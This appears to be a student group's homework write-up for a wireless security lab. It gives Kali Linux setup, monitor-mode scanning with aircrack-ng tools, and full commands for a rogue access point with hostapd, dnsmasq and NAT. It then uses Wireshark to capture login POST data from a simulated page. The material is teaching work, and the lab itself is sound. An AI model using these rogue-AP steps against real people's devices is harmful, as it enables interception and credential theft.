# Homework 7

## Table of contents

- [USE LiveUSB](#use-liveusb)

    - [Hardare](#hardare)
    - [Set And Open LiveUSB](#set-and-open-liveusb)

- [Task1: Shadow IT](#task1-shadow-it)

    - [Step](#step)
    - [Result](#result-for-task-1)

- [Task2: Fake AP and MITM Attack](#task2-fake-ap-and-mitm-attack)

    - [Set hostapd](#set-hostapd)
    - [Set DHCP & MiTM attack Tool](#set-dhcp)
    - [MITM Attack](#mitm-attack)
    - [Result](#result-for-task-2)

- [Contribution Table](#contribution-table)

## USE LiveUSB

### Hardare

- ALFA AWUS036ACM (MediaTek MT7610U/MT7612U)

### Set And Open LiveUSB

- download [download kali-linux-2025.3-live-amd64.iso](https://www.kali.org/get-kali/#kali-live)
- use [download rufus-4.11.exe](https://rufus.ie/zh_TW/) store kali-linux in USB
- open host BIOS

    - BOOT ->  BOOT Order

        - find [XXX flash]
        - F6 move to top
        - F10 save

- ativate kali linux on host
- check network connection

## Task1: Shadow IT

### Step

1. Check interface names and status

    ```bash
    ip a || iwconfig (e.g., wlan0、1)
    ```

    ![iwconfig](./images/iwconfig.jpg)

2. Terminate all processes that may interfere with aircrack-ng

    ```bash
    sudo airmon-ng check kill
    ```

3. Enable monitor mode on the interface

    ```bash
    sudo airmon-ng start <interface_name> (e.g., wlan1)
    ```

    ![airmon-ng_start](./images/airmon-ng_start.jpg)

4. Verify that the monitor interface is successfully enabled

    ```bash
    iwconfig
    ```

    ![iwconfig_2](./images/iwconfig_2.jpg)

5. Perform wireless network scanning

    ```bash
    sudo airodump-ng wlan1mon
    ```

    ![Shadow IT](./images/Shadow-IT.jpg)

6. Stop monitor mode and restart services

    ```bash
    sudo airmon-ng stop wlan1mon 
    sudo service NetworkManager start 
    sudo airmon-ng check kill 
    ```

### Result for task 1

![Shadow-IT_Table](./images/Shadow-IT_Table.jpg)

## Task2: Fake AP and MITM Attack

Prerequisites

- Ensure you have an active internet connection.
- When you run the wihotspot command in the terminal, it calls the hostapd service underneath to create the hotspot.
- If hostapd fails to start or cannot properly configure your wireless adapter, your phone will show “Unable to join”.
- We will bypass the wihotspot GUI and directly create a minimal hostapd configuration to force AP mode to start in the simplest way.

### Set hostapd

1. Stop all network services and clean environment

    ```bash
    sudo service NetworkManager stop
    sudo killall wpa_supplicant
    ```

2. Assign an IP address to the ALFA wireless adapter

    ```bash
    sudo ifconfig wlan1 192.168.10.1 netmask 255.255.255.0 up
    ```

3. Create the hostapd configuration file

    ```bash
    sudo nano /etc/hostapd/hostapd-alfa.conf
    ```

4. Write the following configuration:

    ```bash
    interface=wlan1
    driver=nl80211
    ssid=Group2
    channel=6
    hw_mode=g
    wpa=2
    wpa_passphrase=12345678
    wpa_key_mgmt=WPA-PSK
    rsn_pairwise=CCMP
    ```

    > (In nano: press Ctrl+O to save, Enter to confirm, Ctrl+X to exit)

5. Try starting hostapd directly

    ```bash
    sudo hostapd /etc/hostapd/hostapd-alfa.conf
    ```

> The wireless hotspot has been successfully created, but it does not assign IP addresses to connected devices, so we will use DHCP to provide IP configuration next.

### Set DHCP

1. Install dnsmasq

    ```bash
    sudo apt install dnsmasq
    ```

2. Configure IP forwarding and NAT

    ```bash
    sudo sysctl -w net.ipv4.ip_forward=1
    ```

3. Clear all old iptables rules:

    ```bash
    sudo iptables --flush
    sudo iptables --table nat --flush
    sudo iptables --delete-chain
    sudo iptables --table nat --delete-chain
    ```

4. Set NAT rules (forward wlan1 traffic through eth0)

    ```bash
    sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
    sudo iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT
    sudo iptables -A FORWARD -i eth0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT
    ```

5. Configure dnsmasq (DHCP & DNS)

    ```bash
    sudo nano /etc/dnsmasq.conf
    ```

6. Write the following

    ```bash
    interface=wlan1
    dhcp-range=192.168.10.50,192.168.10.150,12h
    ```

    > (In nano: press Ctrl+O to save, Enter to confirm, Ctrl+X to exit)

7. Start dnsmasq

    ```bash
    sudo service dnsmasq start
    ```

### Set MiTM attack Tool

```bash
sudo apt install wireshark
```

### MITM Attack

#### Open two terminals

- Terminal 1: Start the AP

    ```bash
    sudo hostapd /etc/hostapd/hostapd-alfa.conf
    ```

- Terminal 2: Start Wireshark for MiTM preparation

    ```bash
    wireshark
    ```

> In Kali Linux Wireshark GUI, click "**Capture**" to begin capturing packets.

#### Connect another device to the AP

- WiFi Name: Group02
- Password: 12345678

> Join the AP using any mobile device (e.g iphone15 ).
> Custom WiFi Name & Password

#### Visit the simulated login page

```bash
http://123.0.225.253/fakeLogin/
```

- Enter:

    - email: `test@capture.com`
    - password: 123456
    - Click login.
    - If Error: 501 appears, ignore it.

#### Stop the packet capture and extract POST data

In Wireshark GUI, click the red square button to stop capturing.

Apply filter:

```bash
http.request.method == "POST"
```

### Result for task 2

![MITM_Attack_result](./images/MITM_Attack_result.jpg)

## Contribution Table

| Student ID | Works | Percentage |
| - | - | - |
| 314581015 | Set And Open LiveUSB            | 20% |
| 313581047 | Set hostapd                     | 20% |
| 313581038 | Task1: Shadow IT                | 20% |
| 313581055 | Set DHCP & Set MiTM attack Tool | 20% |
| 412581005 | Task1,Task2 Result              | 20% |
